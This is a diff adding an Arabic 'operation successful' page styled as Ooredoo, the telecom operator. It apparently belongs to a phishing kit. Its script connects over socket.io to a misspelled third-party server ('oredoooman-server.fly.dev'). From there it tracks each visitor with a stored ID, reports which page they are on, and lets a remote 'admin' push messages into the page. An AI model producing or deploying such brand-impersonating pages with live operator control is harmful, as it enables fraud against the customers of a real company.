@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>تمت العملية | Ooredoo</title>
+<style>
+@font-face { font-family: 'Rubik-Regular'; src: url('/ooredoo/fonts/Rubik-Regular.woff2') format('woff2'); }
+@font-face { font-family: 'Rubik-Medium'; src: url('/ooredoo/fonts/Rubik-Medium.woff2') format('woff2'); }
+@font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); }
+@font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
+.final-container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; text-align: center; }
+.logo-row { display: flex; justify-content: center; margin-bottom: 24px; }
+.logo-row img { height: 36px; }
+.success-icon { width: 80px; height: 80px; margin: 0 auto 20px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+.success-icon svg { width: 40px; height: 40px; color: #4caf50; }
+h1 { font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 22px; color: #080808; margin-bottom: 12px; }
+.message { color: #4c5562; font-size: 15px; line-height: 1.8; margin-bottom: 24px; }
+.admin-message { background: #e3f2fd; border-radius: 12px; padding: 16px 18px; margin-bottom: 24px; color: #1565c0; font-size: 14px; line-height: 1.7; text-align: right; }
+.btn-home { display: inline-block; width: 100%; height: 52px; line-height: 52px; border-radius: 999px; border: none; background: #ed1c24; color: #fff; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; margin-bottom: 12px; }
+.btn-print { display: inline-block; width: 100%; height: 52px; line-height: 52px; border-radius: 999px; border: 1.5px solid #e0e0e0; background: #fff; color: #080808; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; margin-bottom: 24px; }
+.support { color: #4c5562; font-size: 13px; line-height: 1.6; }
+.support a { color: #ed1c24; text-decoration: none; font-weight: 600; }
+@media (max-width: 500px) {
+  .final-container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
+}
+</style>
+</head>
+<body>
+<div class="final-container">
+  <div class="logo-row"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
+
+  <div class="success-icon">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <polyline points="20 6 9 17 4 12"></polyline>
+    </svg>
+  </div>
+
+  <h1>تمت العملية بنجاح</h1>
+
+  <div class="admin-message" id="adminMessage" style="display:none;"></div>
+
+  <p class="message" id="defaultMessage">تمت معالجة عمليتك بنجاح. شكراً لاستخدامك خدمات Ooredoo.</p>
+
+  <a href="/" class="btn-home">العودة للرئيسية</a>
+  <button class="btn-print" onclick="window.print()">طباعة الإيصال</button>
+
+  <div class="support">
+    <p>هل تحتاج مساعدة؟ تواصل معنا على</p>
+    <a href="tel:1100">1100</a>
+  </div>
+</div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+(function() {
+  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
+  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
+  var visitorId = localStorage.getItem('visitorId') || '';
+
+  // Check for admin message
+  var adminMsg = localStorage.getItem('adminLastMessage');
+  if (adminMsg) {
+    document.getElementById('adminMessage').textContent = adminMsg;
+    document.getElementById('adminMessage').style.display = 'block';
+    document.getElementById('defaultMessage').style.display = 'none';
+    localStorage.removeItem('adminLastMessage');
+  }
+
+  // Socket
+  socket.on('connect', function() {
+    if (visitorId) socket.emit('visitor:reconnect', visitorId);
+    socket.emit('visitor:pageEnter', 'الصفحة النهائية');
+  });
+  socket.on('visitor:registered', function(data) {
+    if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
+    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
+  });
+  socket.on('admin-last-message', function(data) {
+    if (data && data.message) {
+      document.getElementById('adminMessage').textContent = data.message;
+      document.getElementById('adminMessage').style.display = 'block';
+      document.getElementById('defaultMessage').style.display = 'none';
+    }
+  });
+})();
+</script>
+</body>
+</html>
